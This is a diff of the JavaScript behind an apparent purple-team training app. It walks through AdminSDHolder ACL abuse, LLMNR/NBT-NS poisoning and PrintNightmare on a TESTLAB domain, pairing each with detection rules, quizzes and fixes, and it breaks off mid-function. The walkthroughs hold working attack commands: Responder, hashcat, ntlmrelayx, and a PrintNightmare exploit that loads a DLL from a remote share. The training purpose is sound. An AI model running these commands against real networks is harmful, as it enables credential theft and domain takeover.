+                title: 'Patch — strip the rogue ACE + tighten audit',
+                eyebrow: 'Step 3 · Patch',
+                est: 4,
+                intro: 'Remove the rogue ACE and enable SACL auditing on AdminSDHolder so future modifications fire Event 5136 immediately.',
+                commands: [
+                    {
+                        label: 'Strip the WriteOwner ACE',
+                        lang: 'powershell',
+                        cmd: 'Remove-DomainObjectAcl -TargetIdentity AdminSDHolder \\\n    -PrincipalIdentity backdoor -Rights All',
+                    },
+                ],
+                detect: '<strong>Run SDProp manually</strong> to flush the ACL change forest-wide: <code>Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters -Name "RunProtectAdminGroupsTask" -Value 1</code>.',
+            },
+        ],
+    },
+    {
+        id: 'bolton.protocol-network.llmnr-nbtns-poisoning',
+        slug: 'llmnr-nbtns-poisoning',
+        category: 'protocol-network',
+        host: 'tlws01',
+        name: 'LLMNR / NBT-NS Poisoning',
+        title: 'LLMNR / NBT-NS poisoning to NetNTLMv2 capture',
+        target: 'tlws01.testlab.local',
+        labelHost: 'tlws01 · workstation',
+        pills: [
+            { text: 'Network', cls: '' },
+            { text: 'T1557.001', cls: '' },
+            { text: 'Covered', cls: 'bw-pill--success' },
+        ],
+        detection: {
+            coverage: 'covered',
+            rules: [
+                {
+                    name: 'LLMNR Spoofing (Responder)',
+                    uuid: 'a6c6c8aa-c4f6-4f4f-9b56-cf2a8f0b5e6a',
+                    coverage: 'full',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_llmnr_spoofing.toml',
+                },
+                {
+                    name: 'NetNTLMv2 Captured by Unusual Source',
+                    uuid: '7a23a8f1-9c2b-4d7e-9a4f-3c8b5e2d9f1a',
+                    coverage: 'indirect',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_smb_relay.toml',
+                },
+            ],
+            kql: 'event.code:5156 AND winlog.event_data.DestPort:("5355" OR "137") AND winlog.event_data.Application:NOT:"System"',
+        },
+        install: {
+            ansibleRole: 'ansible.windows.win_regedit',
+            estSeconds: 15,
+            detectability: 'loud',
+            sideEffects: 'Re-enables LLMNR/NBT-NS resolution on tlws01',
+        },
+        steps: [
+            {
+                id: '01-responder',
+                title: 'Start Responder on the attack subnet',
+                eyebrow: 'Step 1 · Setup',
+                est: 4,
+                intro: 'When a Windows client tries to resolve a hostname that DNS doesn\'t know, it falls back to LLMNR (UDP/5355) and NBT-NS (UDP/137). Responder answers those broadcasts, claiming "I am that host", and proxies an SMB auth flow to capture NetNTLMv2.',
+                commands: [
+                    {
+                        label: 'Run Responder in analyze-then-poison mode',
+                        lang: 'bash',
+                        cmd: 'sudo responder -I eth0 -wv',
+                    },
+                ],
+                output: '[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 10.99.50.12\n[SMB] NTLMv2-SSP Username : TESTLAB\\jdoe\n[SMB] NTLMv2-SSP Hash     : jdoe::TESTLAB:7128...:...',
+                detect: '<strong>Elastic rule fires:</strong> <code>LLMNR Spoofing (Responder)</code> (UUID a6c6c8aa…) — catches the Responder LLMNR-poisoning pattern via Sysmon Event 22 / netflow correlations.',
+            },
+            {
+                id: '02-crack-or-relay',
+                title: 'Crack the NetNTLMv2 hash OR relay it',
+                eyebrow: 'Step 2 · Exploit',
+                est: 8,
+                intro: 'Two parallel paths: crack with hashcat mode <strong>5600</strong>, OR relay via <code>ntlmrelayx</code> to any SMB target where signing is not required.',
+                commands: [
+                    {
+                        label: 'Path A — Crack with hashcat',
+                        lang: 'bash',
+                        cmd: 'hashcat -m 5600 -a 0 /tmp/ntlmv2.hash \\\n    /usr/share/wordlists/rockyou.txt',
+                    },
+                    {
+                        label: 'Path B — Relay to ntlmrelayx',
+                        lang: 'bash',
+                        cmd: 'impacket-ntlmrelayx -tf /opt/targets.txt -smb2support -socks',
+                    },
+                ],
+                assessment: {
+                    question: 'Why does SMB signing being REQUIRED on the relay target defeat the relay attack?',
+                    options: [
+                        'SMB signing encrypts the auth packet so it can\'t be replayed.',
+                        'SMB signing binds the auth session to a server-side key, so a relayed Type-3 message fails MAC verification when forwarded to a different server.',
+                        'SMB signing blocks NetNTLMv2 entirely.',
+                        'It doesn\'t — relay still works.',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'SMB signing computes a per-session MAC over each message using a key derived from the auth response. When the auth response is relayed to a different server, the session key doesn\'t match, and MAC verification fails on the second packet onward. The Type-3 message itself can be relayed but the subsequent SMB ops break.',
+                },
+            },
+            {
+                id: '03-patch',
+                title: 'Patch — disable LLMNR/NBT-NS forest-wide',
+                eyebrow: 'Step 3 · Patch',
+                est: 5,
+                intro: 'Two GPO settings remove the attack primitive entirely. Pair with SMB signing requirement on all endpoints.',
+                commands: [
+                    {
+                        label: 'GPO via PowerShell — disable LLMNR + NBT-NS',
+                        lang: 'powershell',
+                        cmd: 'Set-ItemProperty -Path "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient" \\\n    -Name "EnableMulticast" -Value 0\nGet-NetAdapter | Set-NetAdapterAdvancedProperty \\\n    -DisplayName "NetBIOS Over Tcpip" -DisplayValue "Disabled"',
+                    },
+                ],
+                detect: '<strong>Verification:</strong> re-run Responder — should see no captures within 10 minutes of GPO application. Pair with SMB signing requirement (<code>RequireSecuritySignature=1</code>) to defeat any residual relay attempts.',
+            },
+        ],
+    },
+    {
+        id: 'bolton.known-cve.printnightmare',
+        slug: 'printnightmare',
+        category: 'known-cve',
+        host: 'tldc01',
+        name: 'PrintNightmare — CVE-2021-34527',
+        title: 'PrintNightmare — Print Spooler RCE',
+        target: 'tldc01.testlab.local',
+        labelHost: 'tldc01 · DC · WS22',
+        pills: [
+            { text: 'Known CVE', cls: '' },
+            { text: 'T1068', cls: '' },
+            { text: 'Covered', cls: 'bw-pill--success' },
+        ],
+        detection: {
+            coverage: 'covered',
+            rules: [
+                {
+                    name: 'PrintNightmare Spooler Service Exploitation',
+                    uuid: 'ca7173a4-7b03-4854-b8d8-3cae9f3e7d8b',
+                    coverage: 'full',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/privilege_escalation_printnightmare.toml',
+                },
+                {
+                    name: 'Suspicious Print Spooler File Deletion',
+                    uuid: 'b624bd2b-1f72-49c8-9c8b-fd6f7c9f6c2f',
+                    coverage: 'full',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/privilege_escalation_printspoofer.toml',
+                },
+            ],
+            kql: 'process.name:"spoolsv.exe" AND file.path:*"PRINTERS"* AND event.action:"creation"',
+        },
+        install: {
+            ansibleRole: 'ansible.windows.win_service',
+            estSeconds: 10,
+            detectability: 'loud',
+            sideEffects: 'Re-enables Print Spooler on DC (default-disabled by hardening baseline)',
+        },
+        steps: [
+            {
+                id: '01-confirm-spooler',
+                title: 'Confirm Print Spooler is running on the DC',
+                eyebrow: 'Step 1 · Recon',
+                est: 3,
+                intro: 'CVE-2021-34527 requires the <code>Print Spooler</code> service to be running and an authenticated RPC binding to <code>\\pipe\\spoolss</code>. DCs should never run Spooler — it\'s the canonical hardening miss.',
+                commands: [
+                    {
+                        label: 'Probe Print Spooler RPC interface',
+                        lang: 'bash',
+                        cmd: 'rpcdump.py @10.99.50.10 | grep -i "Print System"',
+                    },
+                ],
+                output: 'Protocol: [MS-RPRN]: Print System Remote Protocol\nProvider: spoolsv.exe\nBindings:\n  ncacn_np:\\\\TLDC01[\\PIPE\\spoolss]',
+                detect: '<strong>Elastic rule fires:</strong> none for enumeration. The signal is on exploit.',
+            },
+            {
+                id: '02-exploit',
+                title: 'Drop a SYSTEM DLL via AddPrinterDriverEx',
+                eyebrow: 'Step 2 · Exploit',
+                est: 7,
+                intro: 'The Print Spooler runs as SYSTEM. <code>AddPrinterDriverEx</code> over RPC loads any DLL the caller can write to a UNC path — including via SMB share you control.',
+                commands: [
+                    {
+                        label: 'Cube0x0 PrintNightmare exploit',
+                        lang: 'bash',
+                        cmd: "python3 CVE-2021-1675.py TESTLAB.LOCAL/j.doe:'Welcome1!'@10.99.50.10 \\\n    '\\\\\\\\10.99.50.100\\\\share\\\\nightmare.dll'",
+                    },
+                ],
+                output: '[*] Trying pipe \\PIPE\\spoolss\n[+] Bind OK\n[*] Executing \\\\10.99.50.100\\share\\nightmare.dll\n[+] Stage0 complete',
+                detect: '<strong>Elastic rule fires:</strong> <code>PrintNightmare Spooler Service Exploitation</code> — fires on Sysmon Event 11 (file creation under <code>spoolsv.exe</code> in the printer drivers folder).',
+                assessment: {
+                    question: 'What is the simplest single-action mitigation for PrintNightmare?',
+                    options: [
+                        'Patch every KB on the DC',
+                        'Stop and disable the Print Spooler service on every DC and server that doesn\'t need to print',
+                        'Block SMB outbound from the DC',
+                        'Rotate the krbtgt key twice',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'Stopping Spooler entirely eliminates the attack surface. KB patches exist but have been bypassed multiple times. Microsoft\'s own guidance is "disable Spooler on DCs unless print services are required" — and that\'s the canonical PrintNightmare hardening.',
+                },
+            },
+            {
+                id: '03-patch',
+                title: 'Patch — disable Spooler on DCs',
+                eyebrow: 'Step 3 · Patch',
+                est: 3,
+                intro: 'The single-line fix.',
+                commands: [
+                    {
+                        label: 'Stop + disable the Print Spooler service',
+                        lang: 'powershell',
+                        cmd: 'Stop-Service Spooler -Force\nSet-Service Spooler -StartupType Disabled',
+                    },
+                ],
+                detect: '<strong>Verification:</strong> re-run step 1 — <code>rpcdump.py</code> should no longer expose the Print System binding on tldc01.',
+            },
+        ],
+    },
+];
+
+// ─── DEFAULT STATE ──────────────────────────────────────────────────────
+const DEFAULT_STATE = {
+    selectedVulnId: 'bolton.identity-kerberos.kerberoastable-svc',
+    activeTab: 'walkthrough',
+    splitRatio: DEFAULT_RATIO,
+    filterCategory: 'all',
+    filterHost: 'all',
+    filterSearch: '',
+    perVuln: {},
+};
+
+let state = loadState();
+let autoAdvanceTimer = null;
+
+function loadState() {
+    try {
+        const raw = localStorage.getItem(LS_STATE);
+        const sr = localStorage.getItem(LS_SPLIT);
+        const merged = Object.assign({}, DEFAULT_STATE, raw ? JSON.parse(raw) : {});
+        if (sr) merged.splitRatio = parseFloat(sr) || DEFAULT_RATIO;
+        if (!merged.perVuln) merged.perVuln = {};
+        return merged;
+    } catch (e) {
+        return Object.assign({}, DEFAULT_STATE);
+    }
+}
+
+function saveState() {
+    try {
+        localStorage.setItem(LS_STATE, JSON.stringify(state));
+        localStorage.setItem(LS_SPLIT, String(state.splitRatio));
+    } catch (e) { /* swallow quota errors */ }
+}
+
+function vulnById(id) {
+    return VULNS.find(v => v.id === id);
+}
+
+function perVuln(id) {
+    if (!state.perVuln[id]) {
+        state.perVuln[id] = {
+            currentStepIndex: 0,
+            completedSteps: [],
+            assessmentAnswers: {},
+            installState: 'not_installed',
+            installProgress: 0,
+        };
+    }
+    return state.perVuln[id];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   DRAGGABLE SPLIT
+   ═══════════════════════════════════════════════════════════════════════ */
+
+function initSplit() {
+    const split = document.getElementById('bw-split');
+    const handle = document.getElementById('bwHandle');
+    let dragging = false;
+
+    applySplitRatio(state.splitRatio);
+
+    const onDown = (e) => {
+        dragging = true;
+        split.classList.add('is-dragging');
+        handle.setPointerCapture(e.pointerId);
+        e.preventDefault();
+    };
+    const onMove = (e) => {
+        if (!dragging) return;
+        const rect = split.getBoundingClientRect();
+        const railOffset = document.querySelector('.rti-rail').offsetWidth;
+        const x = e.clientX - rect.left;
+        const ratio = x / rect.width;
+        applySplitRatio(ratio, /*persist=*/false);
+    };
+    const onUp = (e) => {
+        if (!dragging) return;
+        dragging = false;
+        split.classList.remove('is-dragging');
+        try { handle.releasePointerCapture(e.pointerId); } catch (_) {}
+        saveState();
+    };
+    handle.addEventListener('pointerdown', onDown);
+    handle.addEventListener('pointermove', onMove);
+    handle.addEventListener('pointerup', onUp);
+    handle.addEventListener('pointercancel', onUp);
+
+    handle.addEventListener('dblclick', () => {
+        applySplitRatio(DEFAULT_RATIO);
+        saveState();
+    });
+
+    // Keyboard accessibility on the handle
+    handle.addEventListener('keydown', (e) => {
+        const step = 0.02;
+        if (e.key === 'ArrowLeft') { applySplitRatio(state.splitRatio - step); saveState(); e.preventDefault(); }
+        else if (e.key === 'ArrowRight') { applySplitRatio(state.splitRatio + step); saveState(); e.preventDefault(); }
+    });
+}
+
+function applySplitRatio(ratio, persist = true) {
+    const split = document.getElementById('bw-split');
+    const rect = split.getBoundingClientRect();
+    const totalW = rect.width;
+
+    // Constraints:
+    //  catalog min: 280px, max: 50%
+    //  walkthrough min: 480px
+    const catMin = 280 / totalW;
+    const catMaxByPct = 0.5;
+    const catMaxByWalk = 1 - (480 / totalW);
+    const catMax = Math.min(catMaxByPct, catMaxByWalk);
+
+    if (catMax < catMin) {
+        // Very narrow viewport — clamp to a sane fraction
+        ratio = catMin;
+    } else {
+        ratio = Math.max(catMin, Math.min(catMax, ratio));
+    }
+    state.splitRatio = ratio;
+    document.documentElement.style.setProperty('--split-left', `${(ratio * 100).toFixed(3)}%`);
+    if (persist) saveState();
+}
+
+window.addEventListener('resize', () => applySplitRatio(state.splitRatio));
+
+/* ═══════════════════════════════════════════════════════════════════════
+   CATALOG (left pane)
+   ═══════════════════════════════════════════════════════════════════════ */
+
+function renderCatalog() {
+    const list = document.getElementById('catList');
+    list.innerHTML = '';
+
+    const filtered = VULNS.filter(v => matchesFilters(v));
+
+    if (filtered.length === 0) {
+        const li = document.createElement('li');
+        li.className = 'bw-cat__empty';
+        li.textContent = 'No vulns match the current filters.';
+        list.appendChild(li);
+        return;
+    }
+
+    filtered.forEach(v => {
+        const pv = perVuln(v.id);
+        const total = v.steps.length;
+        const done = pv.completedSteps.length;
+        const li = document.createElement('li');
+        li.className = 'bw-cat__row' + (v.id === state.selectedVulnId ? ' is-selected' : '');
+        li.dataset.id = v.id;
+
+        const pillsHtml = v.pills.map(p =>
+            `<span class="bw-pill ${p.cls}">${escapeHtml(p.text)}</span>`
+        ).join('');
+
+        const statusHtml = done > 0
+            ? `<span class="check">✓</span>${done}/${total}`
+            : `Step 1/${total}`;
+
+        li.innerHTML = `
+            <div>
+                <div class="bw-cat__row-title">${escapeHtml(v.name)}</div>
+                <div class="bw-cat__row-id">${escapeHtml(v.id)}</div>
+                <div class="bw-cat__row-pills">${pillsHtml}</div>
+            </div>
+            <div class="bw-cat__row-status">${statusHtml}</div>
+        `;
+        li.addEventListener('click', () => selectVuln(v.id));
+        list.appendChild(li);
+    });
+}
+
+function matchesFilters(v) {
+    if (state.filterHost !== 'all' && v.host !== state.filterHost) return false;
+    if (state.filterCategory !== 'all' && v.category !== state.filterCategory) return false;
+    if (state.filterSearch) {
+        const q = state.filterSearch.toLowerCase();
+        if (!v.name.toLowerCase().includes(q) && !v.id.toLowerCase().includes(q)) return false;
+    }
+    return true;
+}
+
+function selectVuln(id) {
+    state.selectedVulnId = id;
+    state.activeTab = 'walkthrough';
+    saveState();
+    renderCatalog();
+    renderWalkthrough();
+}
+
+function initCatalogControls() {
+    // Search
+    const search = document.getElementById('catSearch');
+    search.value = state.filterSearch || '';
+    search.addEventListener('input', (e) => {
+        state.filterSearch = e.target.value;
+        saveState();
+        renderCatalog();
+    });
+    // Host
+    const host = document.getElementById('catHost');
+    host.value = state.filterHost || 'all';
+    host.addEventListener('change', (e) => {
+        state.filterHost = e.target.value;
+        saveState();
+        renderCatalog();
+    });
+    // Chips
+    document.querySelectorAll('#catChips .bw-cat__chip').forEach(chip => {
+        if (chip.dataset.cat === state.filterCategory) {
+            chip.classList.add('is-active');
+        } else {
+            chip.classList.remove('is-active');
+        }
+        chip.addEventListener('click', () => {
+            state.filterCategory = chip.dataset.cat;
+            document.querySelectorAll('#catChips .bw-cat__chip').forEach(c => c.classList.toggle('is-active', c === chip));
+            saveState();
+            renderCatalog();
+        });
+    });
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   WALKTHROUGH (right pane)
+   ═══════════════════════════════════════════════════════════════════════ */
+
+function renderWalkthrough() {
+    renderStepRail();
+    renderBodyCol();
+}
+
+function renderStepRail() {
+    const list = document.getElementById('stepRailList');
+    list.innerHTML = '';
+    if (!state.selectedVulnId) return;
+
+    const v = vulnById(state.selectedVulnId);
+    if (!v) return;
+    const pv = perVuln(v.id);
+
+    v.steps.forEach((s, idx) => {
+        const isDone = pv.completedSteps.includes(s.id);
+        const isCurrent = idx === pv.currentStepIndex;
+        const isFuture = idx > pv.currentStepIndex + 1 && !isDone;
+
+        const li = document.createElement('li');
+        const btn = document.createElement('button');
+        btn.type = 'button';
+        btn.className = 'bw-rail__step' +
+            (isCurrent ? ' is-current' : '') +
+            (isDone ? ' is-done' : '') +
+            (isFuture ? ' is-future' : '');
+        btn.innerHTML = `
+            <span class="bw-rail__step-num">${isDone ? '✓' : (idx + 1)}</span>
+            <span class="bw-rail__step-text">
+                ${escapeHtml(s.title)}
+                <span class="bw-rail__step-time">≈ ${s.est} min</span>
+            </span>
+        `;
+        btn.addEventListener('click', () => goToStep(idx));
+        li.appendChild(btn);
+        list.appendChild(li);
+    });
+}
+
+function renderBodyCol() {
+    const col = document.getElementById('bodyCol');
+    col.innerHTML = '';
+
+    if (!state.selectedVulnId) {
+        col.appendChild(buildEmptyState());
+        return;
+    }
+
+    const v = vulnById(state.selectedVulnId);
+    if (!v) {
+        col.appendChild(buildEmptyState());
+        return;
+    }
+    const pv = perVuln(v.id);
+    const total = v.steps.length;
+    const stepIdx = Math.min(pv.currentStepIndex, total - 1);
+    const step = v.steps[stepIdx];
+    const progress = Math.round((pv.completedSteps.length / total) * 100);
+
+    // Sticky header
+    const sticky = document.createElement('div');
+    sticky.className = 'bw-sticky';
+    sticky.innerHTML = `
+        <button class="bw-sticky__back" type="button" id="backToCatalog" aria-label="Back to catalog">← Back to catalog</button>
+        <div class="bw-sticky__head-row">
+            <div class="bw-sticky__head-text">
+                <span class="bw-eyebrow">Bolt-on walkthrough · TESTLAB</span>
+                <h1 class="bw-title">${escapeHtml(v.title)}</h1>
+                <p class="bw-subtitle">${escapeHtml(v.id)} · target <strong>${escapeHtml(v.target)}</strong></p>
+            </div>
+            <div class="bw-sticky__right">
+                <span class="bw-dots" id="stepDots" aria-label="Step ${stepIdx + 1} of ${total}"></span>
+                <span class="bw-step-label">Step ${stepIdx + 1} of ${total} · ${progress}% complete</span>
+            </div>
+        </div>
+        <div class="bw-progress"><div class="bw-progress__bar" id="progressBar" style="width:${progress}%"></div></div>
+        <nav class="bw-tabs" role="tablist">
+            <button class="bw-tab" type="button" role="tab" data-tab="walkthrough">Walkthrough</button>
+            <button class="bw-tab" type="button" role="tab" data-tab="detections">Detections</button>
+            <button class="bw-tab" type="button" role="tab" data-tab="install">Install</button>
+        </nav>
+    `;
+    col.appendChild(sticky);
+
+    // Body
+    const body = document.createElement('div');
+    body.className = 'bw-walk__body';
+    col.appendChild(body);
+
+    // Wire dots
+    const dotsEl = sticky.querySelector('#stepDots');
+    v.steps.forEach((s, i) => {
+        const d = document.createElement('button');
+        d.type = 'button';
+        d.className = 'bw-dot' +
+            (pv.completedSteps.includes(s.id) ? ' is-done' : '') +
+            (i === stepIdx ? ' is-current' : '');
+        d.setAttribute('aria-label', `Jump to step ${i + 1}: ${s.title}`);
+        d.addEventListener('click', () => goToStep(i));
+        dotsEl.appendChild(d);
+    });
+
+    // Wire tabs
+    sticky.querySelectorAll('.bw-tab').forEach(t => {
+        if (t.dataset.tab === state.activeTab) t.classList.add('is-active');
+        t.addEventListener('click', () => {
+            state.activeTab = t.dataset.tab;
+            saveState();
+            renderBodyCol();
+        });
+    });
+
+    // Wire back-to-catalog
+    sticky.querySelector('#backToCatalog').addEventListener('click', () => {
+        backToCatalog();
+    });
+
+    // Render the active tab content
+    if (state.activeTab === 'walkthrough') {
+        body.appendChild(buildStepArticle(v, step, stepIdx));
+    } else if (state.activeTab === 'detections') {
+        body.appendChild(buildDetectionsView(v));
+    } else if (state.activeTab === 'install') {
+        body.appendChild(buildInstallView(v));
+    }
+}
+
+function buildEmptyState() {
+    const wrap = document.createElement('div');
+    wrap.className = 'bw-empty';
+    wrap.innerHTML = `
+        <div class="bw-empty__icon">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M9 18l6-6-6-6"/>
+            </svg>
+        </div>
+        <h2 class="bw-empty__title">Pick a vuln from the catalog to start a walkthrough</h2>
+        <p class="bw-empty__sub">Use the search box, category chips, or host filter on the left to narrow the catalog. Press <kbd>?</kbd> to see keyboard shortcuts.</p>
+    `;
+    return wrap;
+}
+
+function buildStepArticle(v, step, stepIdx) {
+    const pv = perVuln(v.id);
+    const isComplete = pv.completedSteps.includes(step.id);
+    const isLast = stepIdx === v.steps.length - 1;
+
+    const article = document.createElement('article');
+    article.className = 'bw-article bw-step-anim';
+    article.setAttribute('data-step', step.id);
+
+    // Header
+    let html = `
+        <div class="bw-article__head">
+            <span class="bw-article__eyebrow">${escapeHtml(step.eyebrow)}</span>
+            <span class="bw-article__time">≈ ${step.est} min</span>
+        </div>
+        <h2 class="bw-article__title">${escapeHtml(step.title)}</h2>
+        <p>${step.intro}</p>
+    `;
+
+    // Commands
+    if (step.commands && step.commands.length) {
+        step.commands.forEach((cmd, idx) => {
+            html += `<span class="bw-cmd__label">${escapeHtml(cmd.label)}</span>`;
+            html += buildCmdBlockHtml(cmd.cmd, `step-${step.id}-cmd-${idx}`);
+        });
+    }
+
+    // Output
+    if (step.output) {
+        html += `<span class="bw-cmd__label">Expected output</span>`;
+        html += `<pre class="bw-output"><code>${escapeHtml(step.output)}</code></pre>`;
+    }
+
+    // BOF callout
+    if (step.bof) {
+        const repoLink = step.bof.repo
+            ? `<p>Source: <a href="${step.bof.repo.url}" rel="noopener" target="_blank">${escapeHtml(step.bof.repo.name)}</a></p>`
+            : '';
+        html += `
+            <div class="bw-callout">
+                <span class="bw-callout__eyebrow">Cobalt Strike BOF alternative</span>
+                <p>${step.bof.intro}</p>
+                ${buildCmdBlockHtml(step.bof.cmd, `step-${step.id}-bof`)}
+                ${repoLink}
+            </div>
+        `;
+    }
+
+    // Detection notes
+    if (step.detect) {
+        html += `<blockquote class="bw-quote">${step.detect}</blockquote>`;
+    }
+
+    article.innerHTML = html;
+
+    // Assessment
+    if (step.assessment) {
+        const quiz = buildQuizSection(v.id, step);
+        article.appendChild(quiz);
+    }
+
+    // Footer (Back / Mark / Continue)
+    const foot = document.createElement('footer');
+    foot.className = 'bw-foot';
+
+    const left = document.createElement('div');
+    left.className = 'bw-foot__left';
+    const backBtn = document.createElement('button');
+    backBtn.type = 'button';
+    backBtn.className = 'bw-btn bw-btn--ghost';
+    backBtn.innerHTML = '← Back';
+    backBtn.disabled = stepIdx === 0;
+    backBtn.addEventListener('click', () => goToStep(stepIdx - 1));
+    left.appendChild(backBtn);
+
+    const hint = document.createElement('span');
+    hint.className = 'bw-foot__hint';
+    hint.textContent = `Use ← → keys to navigate · Space to mark complete`;
+    left.appendChild(hint);
+
+    foot.appendChild(left);
+
+    const right = document.createElement('div');
+    right.className = 'bw-foot__right';
+
+    // Mark complete
+    const mark = document.createElement('button');
+    mark.type = 'button';
+    mark.className = 'bw-mark' + (isComplete ? ' is-done' : '');
+    mark.innerHTML = `
+        <span class="bw-mark__box">
+            <svg viewBox="0 0 12 12" fill="none" aria-hidden="true">
+                <path d="M2 6.5l2.5 2.5L10 3" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </span>
+        <span>${isComplete ? 'Completed' : 'Mark complete'}</span>
+    `;
+    mark.addEventListener('click', () => toggleStepComplete(v.id, step.id, stepIdx));
+    right.appendChild(mark);
+
+    // Continue button
+    const continueBtn = document.createElement('button');
+    continueBtn.type = 'button';
+    continueBtn.className = 'bw-btn bw-btn--primary';
+    const allDone = pv.completedSteps.length === v.steps.length;
+    if (isLast && allDone) {
+        continueBtn.innerHTML = '✓ Walkthrough complete — Back to catalog';
+        continueBtn.addEventListener('click', () => backToCatalog());
+    } else if (isLast) {
+        continueBtn.innerHTML = 'Finish step →';
+        continueBtn.addEventListener('click', () => {
+            if (!pv.completedSteps.includes(step.id)) toggleStepComplete(v.id, step.id, stepIdx);
+        });
+    } else {
+        const nextTitle = v.steps[stepIdx + 1].title;
+        continueBtn.innerHTML = `Continue → <span style="opacity:0.75;font-weight:500;margin-left:4px;font-size:11.5px;">Step ${stepIdx + 2}</span>`;
+        continueBtn.title = `Next: ${nextTitle}`;
+        continueBtn.addEventListener('click', () => goToStep(stepIdx + 1));
+    }
+    right.appendChild(continueBtn);
+
+    foot.appendChild(right);
+    article.appendChild(foot);
+
+    // Hook copy buttons
+    setTimeout(() => wireCopyButtons(article), 0);
+
+    return article;
+}
+
+function buildCmdBlockHtml(cmd, idSeed) {
+    const escaped = escapeHtml(cmd);
+    return `
+        <div class="bw-cmd" data-cmd-seed="${idSeed}">
+            <pre class="bw-cmd__pre"><code data-raw-cmd>${escaped}</code></pre>
+            <button class="bw-cmd__copy" type="button" data-copy-btn aria-label="Copy command">
+                <svg viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                    <rect x="4" y="4" width="9" height="10" rx="1.5" stroke="currentColor" stroke-width="1.3"/>
+                    <path d="M11 4V3a1 1 0 00-1-1H4a1 1 0 00-1 1v9a1 1 0 001 1h1" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
+                </svg>
+                <span data-copy-label>Copy</span>
+            </button>
+        </div>
+    `;
+}
+
+function wireCopyButtons(scope) {
+    const blocks = scope.querySelectorAll('.bw-cmd');
+    blocks.forEach(block => {
+        const btn = block.querySelector('[data-copy-btn]');
+        const code = block.querySelector('[data-raw-cmd]');
+        if (!btn || !code) return;
+        btn.addEventListener('click', () => {
+            const text = code.textContent;
+            copyToClipboard(text, btn);
+        });
+    });
+}
+
+function copyToClipboard(text, btn) {
+    const onSuccess = () => {
+        if (btn) {
+            btn.classList.add('is-copied');
+            const label = btn.querySelector('[data-copy-label]');
+            const oldLabel = label ? label.textContent : null;
+            if (label) label.textContent = '✓ Copied';
+            setTimeout(() => {
+                btn.classList.remove('is-copied');
+                if (label && oldLabel) label.textContent = oldLabel;
+            }, 1500);
+        }
+    };
+    const onFail = () => {
+        showToast('Press ⌘C to copy');
+    };
+
+    // Try modern API
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(onSuccess).catch(() => {
+            // Fallback to execCommand
+            if (!execFallback(text)) onFail();
+            else onSuccess();
+        });
+    } else {
+        if (!execFallback(text)) onFail();
+        else onSuccess();
+    }
+}
+
+function execFallback(text) {
+    try {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        ta.style.left = '-9999px';
+        document.body.appendChild(ta);
+        ta.focus(); ta.select();
+        const ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        return ok;
+    } catch (e) { return false; }
+}
+
+function showToast(msg) {
+    const t = document.getElementById('bwToast');
+    t.textContent = msg;
+    t.classList.add('is-visible');
+    setTimeout(() => t.classList.remove('is-visible'), 2200);
+}
+
+/* ─── QUIZ ───────────────────────────────────────────────────────────── */
+
+function buildQuizSection(vulnId, step) {
+    const pv = perVuln(vulnId);
+    const prev = pv.assessmentAnswers[step.id];
+    const wrap = document.createElement('section');
+    wrap.className = 'bw-quiz';
+
+    const correctIdx = step.assessment.correctIndex;
+    const optsHtml = step.assessment.options.map((o, i) => {
+        const letter = String.fromCharCode(65 + i);
+        let cls = 'bw-quiz__opt';
+        let disabled = '';
+        if (prev) {
+            disabled = 'disabled';
+            if (i === correctIdx) cls += ' is-correct';
+            else if (i === prev.idx) cls += ' is-wrong';
+        }
+        return `
+            <button class="${cls}" type="button" data-idx="${i}" ${disabled}>
+                <span class="bw-quiz__opt-marker">${letter}</span>
+                <span>${escapeHtml(o)}</span>
+            </button>
+        `;
+    }).join('');
+
+    wrap.innerHTML = `
+        <h3 class="bw-quiz__heading">Assessment</h3>
+        <p class="bw-quiz__q">${escapeHtml(step.assessment.question)}</p>
+        <div class="bw-quiz__opts">${optsHtml}</div>
+        ${prev ? `<div class="bw-quiz__explain"><strong>${prev.correct ? 'Correct.' : 'Not quite.'}</strong> ${escapeHtml(step.assessment.explanation)}</div>` : ''}
+    `;
+
+    wrap.querySelectorAll('.bw-quiz__opt').forEach(btn => {
+        btn.addEventListener('click', () => {
+            if (prev) return;
+            const idx = parseInt(btn.dataset.idx, 10);
+            const correct = idx === correctIdx;
+            pv.assessmentAnswers[step.id] = { idx, correct };
+            saveState();
+            renderBodyCol();
+        });
+    });
+
+    return wrap;
+}
+
+/* ─── DETECTIONS TAB ─────────────────────────────────────────────────── */
+
+function buildDetectionsView(v) {
+    const wrap = document.createElement('div');
+    wrap.className = 'bw-det bw-step-anim';
+
+    const covClass = v.detection.coverage === 'covered'
+        ? 'bw-det__cov--covered'
+        : v.detection.coverage === 'partial' ? 'bw-det__cov--partial' : 'bw-det__cov--norule';
+    const covLabel = v.detection.coverage === 'covered'
+        ? '● Coverage: covered'
+        : v.detection.coverage === 'partial' ? '● Coverage: partial' : '● Coverage: no rule';
+
+    let rowsHtml = v.detection.rules.map((r, i) => `
+        <tr>
+            <td>${escapeHtml(r.name)}</td>
+            <td class="bw-det__uuid">${escapeHtml(r.uuid)}</td>
+            <td><span class="bw-pill ${r.coverage === 'full' ? 'bw-pill--success' : r.coverage === 'indirect' ? 'bw-pill--warn' : ''}">${escapeHtml(r.coverage)}</span></td>
+            <td>
+                <div class="bw-det__link-cell">
